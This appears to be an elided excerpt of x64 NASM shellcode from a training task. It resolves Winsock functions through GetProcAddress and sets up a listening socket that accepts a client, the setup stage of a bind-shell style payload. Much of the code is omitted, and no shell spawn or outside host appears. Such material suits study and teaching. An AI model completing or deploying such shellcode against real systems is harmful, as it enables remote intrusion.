...
;; .
;; Compile shellcode:
;; $ nasm -f bin task2_sc.asm -o task2_sc.obj
;; .
...
WinMain:
        ...
        ; WS2_32.DLL
        %local  hWs2_32:qword
        %local  pWSAStartup:qword
        %local  pWSASocketW:qword
        %local  pInetPtonA:qword
        %local  pHtons:qword
        %local  pConnect:qword
        %local  pSend:qword
        %local  pClosesocket:qword

        %local  pGetsockname:qword
        %local  pNtohs:qword
        %local  pBind:qword
        %local  pListen:qword
        %local  pWSAAccept:qword

        ; STRUCTURES
        local_buf stWsaData, 408
        local_buf stAddrServer, 16
        ...
        ; OTHER VARS
        %local  iPort:qword
        %local  iSockServer:qword
        %local  iSockClient:qword
        %local  iSockFound:qword
        ...
        lea     rdx, [szWSAStartup]
        call    qword [pGetProcAddress]
        mov     qword [pWSAStartup], rax
        ; WSASocketW
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szWSASocketW]
        call    qword [pGetProcAddress]
        mov     qword [pWSASocketW], rax
        ; InetPtonA
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szInetPtonA]
        call    qword [pGetProcAddress]
        mov     qword [pInetPtonA], rax
        ; htons
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szHtons]
        call    qword [pGetProcAddress]
        mov     qword [pHtons], rax
        ; connect
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szConnect]
        call    qword [pGetProcAddress]
        mov     qword [pConnect], rax
        ; closesocket
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szClosesocket]
        call    qword [pGetProcAddress]
        mov     qword [pClosesocket], rax
        ; send
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szSend]
        call    qword [pGetProcAddress]
        ...
        lea     rdx, [szListen]
        call    qword [pGetProcAddress]
        mov     qword [pListen], rax
        ; WSAAccept
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szWSAAccept]
        call    qword [pGetProcAddress]
        mov     qword [pWSAAccept], rax
        ...
        mov     qword [iSockServer], 0
        mov     qword [iSockClient], 0
        mov     qword [iSockFound], 0


        ; Create server socket
        mov     rcx, 514                       ; Version of WSA = 2.2
        lea     rdx, [stWsaData]
        call    qword [pWSAStartup]
        ...
        mov     qword [rsp+32], 0
        mov     qword [rsp+40], 0
        call    qword [pWSASocketW]
        mov     qword [iSockServer], rax

        mov     rcx, qword [iSockServer]
        mov     rdx, 10
        call    PrintNum


        ; Initialize SOCKADDR_IN structure
        lea     r12, [stAddrServer]
        mov     word [r12 + 0], 2              ; stAddrClient.sin_family = AF_INET

        mov     dword [r12 + 4], 0             ; stAddrClient.sin_addr = INADDR_ANY

        mov     rcx, qword [iPort]
        call    qword [pHtons]
        mov     word [r12 + 2], ax             ; stAddrClient.sin_port = PORT
        ...
        mov     r9, 0
        mov     qword [rsp+32], 0
        call    qword [pWSAAccept]
        mov     qword [iSockClient], rax

        mov     rcx, qword [iSockClient]
        mov     rdx, 10
        call    PrintNum
